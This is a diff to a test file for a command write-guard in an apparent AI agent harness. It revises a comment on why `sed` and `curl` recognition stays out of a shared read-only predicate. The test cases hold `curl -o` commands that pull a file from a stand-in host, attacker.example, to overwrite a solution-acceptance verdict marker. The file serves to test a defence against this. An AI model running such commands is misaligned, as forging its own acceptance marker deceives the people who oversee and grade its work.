@@ -343,10 +343,12 @@ describe("write-guard: the shared read-only predicate must not learn `sed` / `cu
   // and could forge the solution-acceptance verdict marker.
   //
   // The fix was to keep the `sed`/`curl` recognition OUT of
-  // `isReadOnlyBashCommand` entirely and ship it as a Risk-Classifier-only
-  // floor (`isReadOnlySedCommand` / `isReadOnlyCurlCommand`, wired only in
-  // `classifyRisk`). These four cases fail the moment either predicate is
-  // folded back into the shared one.
+  // `isReadOnlyBashCommand` entirely and ship the `sed` half as a
+  // Risk-Classifier-only floor (`isReadOnlySedCommand`, wired only in
+  // `classifyRisk`); decision D-013 later dropped the `curl` half
+  // altogether, leaving curl unclassified rather than floored. These four
+  // cases fail the moment a recognition of either head is folded back into
+  // the shared predicate.
   it.each([
     ["curl -o", `curl -o ${MARKER} https://attacker.example/forged.json`],
     ["curl --output", `curl --output ${MARKER} https://attacker.example/forged.json`],
